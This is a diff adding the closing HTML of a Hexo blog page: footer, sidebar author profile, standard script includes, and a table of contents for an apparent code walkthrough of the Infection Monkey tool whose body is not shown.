+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+        
+<script>
+  with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='//bdimg.share.baidu.com/static/api/js/share.js?cdnversion='+~(-new Date()/36e5)];
+</script>
+
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/uploads/avatar.JPG"
+                alt="metang" />
+            
+              <p class="site-author-name" itemprop="name">metang</p>
+              <p class="site-description motion-element" itemprop="description">from Nuaa</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">32</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">6</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">30</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          <div class="links-of-author motion-element">
+            
+              
+                <span class="links-of-author-item">
+                  <a href="https://github.com/metang326" target="_blank" title="GitHub">
+                    
+                      <i class="fa fa-fw fa-github"></i>GitHub</a>
+                </span>
+              
+                <span class="links-of-author-item">
+                  <a href="534747943@qq.com" target="_blank" title="E-Mail">
+                    
+                      <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                </span>
+              
+            
+          </div>
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#monkey-island"><span class="nav-number">1.</span> <span class="nav-text">monkey_island</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#程序流程"><span class="nav-number">1.1.</span> <span class="nav-text">程序流程</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#monkey"><span class="nav-number">2.</span> <span class="nav-text">monkey</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#程序流程-1"><span class="nav-number">2.1.</span> <span class="nav-text">程序流程</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#MONKEY-ARG-则-monkey-cls-InfectionMonkey"><span class="nav-number">2.1.1.</span> <span class="nav-text">MONKEY_ARG 则 monkey_cls = InfectionMonkey</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#DROPPER-ARG-则-monkey-cls-MonkeyDrops"><span class="nav-number">2.1.2.</span> <span class="nav-text">DROPPER_ARG  则 monkey_cls = MonkeyDrops</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#control-py"><span class="nav-number">2.1.3.</span> <span class="nav-text">control.py</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exploit-sshexec-py"><span class="nav-number">2.1.4.</span> <span class="nav-text">exploit/sshexec.py</span></a></li></ol></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; 2017 &mdash; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">metang</span>
+
+  
+</div>
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.3"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.3"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.3"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.3"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.3"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+
+
+
+  
+
+
+
+
+  
+  
+  
+  <link rel="stylesheet" href="/lib/algolia-instant-search/instantsearch.min.css">
+
+  
+  
+  <script src="/lib/algolia-instant-search/instantsearch.min.js"></script>
+  
+
+  <script src="/js/src/algolia-search.js?v=5.1.3"></script>
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+
+
+</body>
+<!-- 页面点击小红心 -->
+<script type="text/javascript" src="/js/src/love.js"></script>
+</html>
